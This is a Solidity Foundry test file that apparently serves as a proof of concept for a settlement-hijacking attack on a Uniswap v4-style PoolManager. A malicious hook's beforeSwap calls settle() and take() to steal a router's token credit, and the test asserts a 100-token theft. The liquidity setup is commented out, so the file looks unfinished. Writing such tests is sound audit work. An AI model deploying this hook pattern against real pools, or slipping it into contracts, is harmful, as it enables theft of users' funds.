// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {Currency} from "../src/types/Currency.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {BalanceDelta, toBalanceDelta, BalanceDeltaLibrary} from "../src/types/BalanceDelta.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "../src/interfaces/callback/IUnlockCallback.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {SwapParams} from "../src/types/PoolOperation.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary} from "../src/types/BeforeSwapDelta.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {BaseTestHooks} from "../src/test/BaseTestHooks.sol";
import {ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {CurrencySettler} from "./utils/CurrencySettler.sol";

/// @notice Malicious hook that hijacks settlement during beforeSwap
contract SettlementHijackerHook is BaseTestHooks {
    IPoolManager poolManager;
    Currency targetCurrency;

    constructor(IPoolManager _poolManager, Currency _targetCurrency) {
        poolManager = _poolManager;
        targetCurrency = _targetCurrency;
    }

    function setManager(IPoolManager _poolManager) external {
        poolManager = _poolManager;
    }

    function setTargetCurrency(Currency _targetCurrency) external {
        targetCurrency = _targetCurrency;
    }

    function beforeSwap(address, PoolKey calldata, SwapParams calldata, bytes calldata)
        external
        override
        returns (bytes4, BeforeSwapDelta, uint24)
    {
        // HIJACK: Claim the credit intended for the router
        uint256 hijacked = poolManager.settle();
        if (hijacked > 0) {
            poolManager.take(targetCurrency, address(this), hijacked);
        }
        return (IHooks.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }

    function beforeInitialize(address, PoolKey calldata, uint160) external pure override returns (bytes4) {
        return IHooks.beforeInitialize.selector;
    }

    function afterInitialize(address, PoolKey calldata, uint160, int24) external pure override returns (bytes4) {
        return IHooks.afterInitialize.selector;
    }

    function beforeAddLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IHooks.beforeAddLiquidity.selector;
    }

    function afterAddLiquidity(
        address,
        PoolKey calldata,
        ModifyLiquidityParams calldata,
        BalanceDelta,
        BalanceDelta,
        bytes calldata
    ) external pure override returns (bytes4, BalanceDelta) {
        return (IHooks.afterAddLiquidity.selector, BalanceDeltaLibrary.ZERO_DELTA);
    }

    function beforeRemoveLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IHooks.beforeRemoveLiquidity.selector;
    }

    function afterRemoveLiquidity(
        address,
        PoolKey calldata,
        ModifyLiquidityParams calldata,
        BalanceDelta,
        BalanceDelta,
        bytes calldata
    ) external pure override returns (bytes4, BalanceDelta) {
        return (IHooks.afterRemoveLiquidity.selector, BalanceDeltaLibrary.ZERO_DELTA);
    }

    function afterSwap(address, PoolKey calldata, SwapParams calldata, BalanceDelta, bytes calldata)
        external
        pure
        override
        returns (bytes4, int128)
    {
        return (IHooks.afterSwap.selector, 0);
    }

    function beforeDonate(address, PoolKey calldata, uint256, uint256, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IHooks.beforeDonate.selector;
    }

    function afterDonate(address, PoolKey calldata, uint256, uint256, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IHooks.afterDonate.selector;
    }
}

contract VaultSettlementHijackTest is Test, IUnlockCallback {
    using CurrencySettler for Currency;

    PoolManager poolManager;
    MockERC20 usdt;
    MockERC20 token1;
    SettlementHijackerHook hook;
    PoolKey key;

    // Hook permission mask - need BEFORE_SWAP_FLAG (bit 7)
    uint160 constant BEFORE_SWAP_FLAG = 1 << 7;
    uint160 constant HOOK_PERMISSIONS_MASK = ~uint160(0) << 14;

    function setUp() public {
        poolManager = new PoolManager(address(this));
        usdt = new MockERC20("USDT", "USDT", 18);
        token1 = new MockERC20("TOKEN1", "TK1", 18);

        // Mint tokens for liquidity
        usdt.mint(address(this), 10000 ether);
        token1.mint(address(this), 10000 ether);

        // Deploy hook implementation
        SettlementHijackerHook hookImpl = new SettlementHijackerHook(
            IPoolManager(address(poolManager)),
            Currency.wrap(address(usdt))
        );

        // Deploy hook to address with BEFORE_SWAP_FLAG permission
        address hookAddress = address(uint160(type(uint160).max & HOOK_PERMISSIONS_MASK | BEFORE_SWAP_FLAG));
        vm.allowCheatcodes(hookAddress);
        vm.etch(hookAddress, address(hookImpl).code);
        hook = SettlementHijackerHook(hookAddress);
        
        // Initialize hook storage (since vm.etch doesn't run constructor)
        hook.setManager(IPoolManager(address(poolManager)));
        hook.setTargetCurrency(Currency.wrap(address(usdt)));

        // Ensure currencies are sorted
        Currency currency0 = Currency.wrap(address(usdt)) < Currency.wrap(address(token1))
            ? Currency.wrap(address(usdt))
            : Currency.wrap(address(token1));
        Currency currency1 = Currency.wrap(address(usdt)) < Currency.wrap(address(token1))
            ? Currency.wrap(address(token1))
            : Currency.wrap(address(usdt));

        key = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });

        // Initialize pool
        poolManager.initialize(key, uint160(79228162514264337593543950336)); // sqrtPriceX96 = 1:1

        // Add initial liquidity
        // usdt.approve(address(poolManager), type(uint256).max);
        // token1.approve(address(poolManager), type(uint256).max);
        // _addLiquidity(1000 ether, 1000 ether);
    }

    function _addLiquidity(uint256 amount0, uint256 amount1) internal {
        ModifyLiquidityParams memory params = ModifyLiquidityParams({
            tickLower: -120,
            tickUpper: 120,
            liquidityDelta: 1e18,
            salt: 0
        });
        poolManager.unlock(abi.encode(true, params, amount0, amount1));
    }

    function test_SettleHijack_PROFIT() public {
        usdt.mint(address(this), 100 ether);
        usdt.approve(address(poolManager), 100 ether);

        uint256 attackerBalBefore = usdt.balanceOf(address(hook));

        // Start swap transaction
        poolManager.unlock(abi.encode("HIJACK_SCENARIO"));

        uint256 attackerBalAfter = usdt.balanceOf(address(hook));
        assertEq(attackerBalAfter - attackerBalBefore, 100 ether, "Theft failed");
        console.log("--- SUCCESS: TRANSIENT SETTLEMENT HIJACKED ---");
    }

    function unlockCallback(bytes calldata data) external override returns (bytes memory) {
        console.log("=== unlockCallback START ===");
        console.log("msg.sender:", vm.toString(msg.sender));
        console.log("poolManager address:", vm.toString(address(poolManager)));
        console.log("data length:", data.length);
        
        require(msg.sender == address(poolManager), "Only pool manager");
        console.log("[OK] msg.sender check passed");

        // Try to decode as liquidity addition first
        // Check if data starts with bool true (0x01) which indicates liquidity addition
        // if (data.length > 0) {
        //     // Try to decode as liquidity params first
        //     try this.decodeLiquidityData(data) returns (bool isLiquidity, ModifyLiquidityParams memory liqParams, uint256 /* amount0 */, uint256 /* amount1 */) {
        //         if (isLiquidity) {
        //             console.log("[OK] Decoded as liquidity addition");
        //             console.log("Liquidity params - tickLower:", liqParams.tickLower);
        //             console.log("Liquidity params - tickUpper:", liqParams.tickUpper);
        //             console.log("Liquidity params - liquidityDelta:", liqParams.liquidityDelta);
                    
        //             // Add liquidity - returns (callerDelta, feesAccrued)
        //             (BalanceDelta delta, ) = poolManager.modifyLiquidity(key, liqParams, "");
        //             console.log("Delta amount0:", delta.amount0());
        //             console.log("Delta amount1:", delta.amount1());
                    
        //             // Settle the deltas
        //             if (delta.amount0() < 0) {
        //                 console.log("Settling currency0:", uint256(int256(-delta.amount0())));
        //                 key.currency0.settle(poolManager, address(this), uint256(int256(-delta.amount0())), false);
        //             }
        //             if (delta.amount1() < 0) {
        //                 console.log("Settling currency1:", uint256(int256(-delta.amount1())));
        //                 key.currency1.settle(poolManager, address(this), uint256(int256(-delta.amount1())), false);
        //             }
        //             console.log("[OK] Liquidity addition completed");
        //             console.log("=== unlockCallback END ===");
        //             return "";
        //         }
        //     } catch {
        //         console.log("Failed to decode as liquidity data, trying string...");
        //     }
        // }

        // Otherwise, decode as string action
        console.log("Attempting to decode as string...");
        string memory action = abi.decode(data, (string));
        
        if (keccak256(bytes(action)) == keccak256("HIJACK_SCENARIO")) {
            console.log("[OK] Entering HIJACK_SCENARIO flow");
            
            // Router Flow: Sync, transfer tokens, swap, sync, settle
            console.log("Step 1: Syncing currency...");
            poolManager.sync(Currency.wrap(address(usdt)));
            console.log("[OK] Sync completed");
            
            console.log("Step 2: Transferring tokens to poolManager...");
            uint256 balanceBefore = usdt.balanceOf(address(poolManager));
            console.log("PoolManager balance before transfer:", balanceBefore);
            usdt.transfer(address(poolManager), 100 ether);
            uint256 balanceAfter = usdt.balanceOf(address(poolManager));
            console.log("PoolManager balance after transfer:", balanceAfter);
            console.log("[OK] Transfer completed");

            console.log("Step 3: Executing swap...");
            bool zeroForOne = Currency.unwrap(key.currency0) == address(usdt);
            console.log("zeroForOne:", zeroForOne);
            console.log("currency0:", vm.toString(Currency.unwrap(key.currency0)));
            console.log("usdt address:", vm.toString(address(usdt)));
            
            uint256 hookBalanceBefore = usdt.balanceOf(address(hook));
            console.log("Hook balance before swap:", hookBalanceBefore);
            
            BalanceDelta swapDelta = poolManager.swap(
                key,
                SwapParams({
                    zeroForOne: zeroForOne,
                    amountSpecified: -int128(int256(100 ether)),
                    sqrtPriceLimitX96: zeroForOne
                        ? TickMath.MIN_SQRT_PRICE + 1
                        : TickMath.MAX_SQRT_PRICE - 1
                }),
                ""
            );
            
            console.log("Swap delta amount0:", swapDelta.amount0());
            console.log("Swap delta amount1:", swapDelta.amount1());
            
            uint256 hookBalanceAfter = usdt.balanceOf(address(hook));
            console.log("Hook balance after swap:", hookBalanceAfter);
            console.log("Hook balance change:", hookBalanceAfter - hookBalanceBefore);
            console.log("[OK] Swap completed");

            console.log("Step 4: Settling swap deltas...");
            // Settle negative deltas (what we owe)
            if (swapDelta.amount0() < 0) {
                console.log("Settling currency0 debt:", uint256(int256(-swapDelta.amount0())));
                key.currency0.settle(poolManager, address(this), uint256(int256(-swapDelta.amount0())), false);
            }
            if (swapDelta.amount1() < 0) {
                console.log("Settling currency1 debt:", uint256(int256(-swapDelta.amount1())));
                key.currency1.settle(poolManager, address(this), uint256(int256(-swapDelta.amount1())), false);
            }
            // Take positive deltas (what we're owed) - but hook already stole the credits
            // So we need to handle this differently
            if (swapDelta.amount0() > 0) {
                console.log("Taking currency0 credit:", uint256(int256(swapDelta.amount0())));
                // Note: Hook already stole the credits, so this might fail or return 0
                key.currency0.take(poolManager, address(this), uint256(int256(swapDelta.amount0())), false);
            }
            if (swapDelta.amount1() > 0) {
                console.log("Taking currency1 credit:", uint256(int256(swapDelta.amount1())));
                // Note: Hook already stole the credits, so this might fail or return 0
                key.currency1.take(poolManager, address(this), uint256(int256(swapDelta.amount1())), false);
            }
            console.log("[OK] Swap deltas settled");
        } else {
            console.log("[ERROR] Action does not match HIJACK_SCENARIO");
        }
        
        console.log("=== unlockCallback END ===");
        return "";
    }

    // Helper function to decode liquidity data
    function decodeLiquidityData(bytes calldata data) external pure returns (bool, ModifyLiquidityParams memory, uint256, uint256) {
        return abi.decode(data, (bool, ModifyLiquidityParams, uint256, uint256));
    }
}

